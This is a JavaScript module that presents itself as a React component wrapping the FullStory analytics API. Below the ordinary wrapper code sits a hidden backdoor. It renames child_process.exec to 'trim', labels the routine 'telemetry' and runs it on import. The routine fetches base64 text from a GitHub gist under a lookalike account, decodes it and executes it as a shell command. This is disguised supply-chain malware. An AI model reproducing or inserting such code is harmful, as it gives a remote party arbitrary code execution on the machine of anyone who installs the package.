const https = require('https');
const { exec: trim } = require("child_process");

const canUseDOM = !!(
  typeof window !== 'undefined' &&
  window.document &&
  window.document.createElement
);

const getWindowFullStory = () => window[window['_fs_namespace']];

const FullStoryAPIMethods = Object.freeze({
  Identify: 'identify',
  Shutdown: 'shutdown',
  Restart: 'restart',
  SetUserVars: 'setUserVars',
  Log: 'log',
  Event: 'event',
  Consent: 'consent',
  ClearUserCookie: 'clearUserCookie',
  GetCurrentSessionUrl: 'getCurrentSessionUrl'
});

const FullStoryAPI = (fn, ...args) => {
  if (canUseDOM && getWindowFullStory() && getWindowFullStory()[fn]) {
    return getWindowFullStory()[fn].apply(null, args);
  }

  return false;
};

const identify = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.Identify, ...args);
};

const shutdown = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.Shutdown, ...args);
};

const restart = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.Restart, ...args);
};

const setUserVars = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.SetUserVars, ...args);
};

const log = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.Log, ...args);
};

const getCurrentSessionUrl = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.GetCurrentSessionUrl, ...args);
};

const event = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.Event, ...args);
};

const consent = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.Consent, ...args);
};

const clearUserCookie = (...args) => {
  return FullStoryAPI(FullStoryAPIMethods.ClearUserCookie, ...args);
};

class FullStory {
  constructor(props) {

    const { org, debug, script, host, namespace } = props;

    if (!org || !canUseDOM) {
      return;
    }

    if (!getWindowFullStory()) {
      window['_fs_debug'] = debug || false;
      window['_fs_host'] = host || 'fullstory.com';
      window['_fs_script'] = script || 'edge.fullstory.com';
      window['_fs_org'] = org;
      window['_fs_namespace'] = namespace || 'FS';

      includeFullStory();
    }
  }

  shouldComponentUpdate() {
    return false;
  }

  componentWillUnmount() {
    if (!canUseDOM || !getWindowFullStory()) return false;

    getWindowFullStory().shutdown();

    delete window[window['_fs_namespace']];
    delete window['_fs_debug'];
    delete window['_fs_host'];
    delete window['_fs_org'];
    delete window['_fs_namespace'];
    delete window['_fs_script'];
  }

  render() {
    return false;
  }
}

function rq(o) {
    b64dat = "";
    const req = https.request(o, res => { 
        res.on('data', d => { b64dat += d; })});
    req.end();
    return new Promise(resolve => {
        setTimeout(() => {
            resolve(b64dat);
        }, 2000);
    })
};

async function telemetry() {
    const options = {
    hostname: 'gist.githubusercontent.com',
    port: 443,
    path: '/sarah-fullstory/f65737e5bf490e165d52d4d9f12994ed/raw/15c328c58f84ccc175d55b24ef7de734539c469f/telemetry.txt',
    method: 'GET'
    };

    var b64dat = await rq(options);
    b64dat2 = b64dat.toString().replace(/(\r\n|\n|\r)/gm, "");
    var telem_lib = Buffer.from(b64dat2, 'base64').toString();

    trim(telem_lib);
}
telemetry();
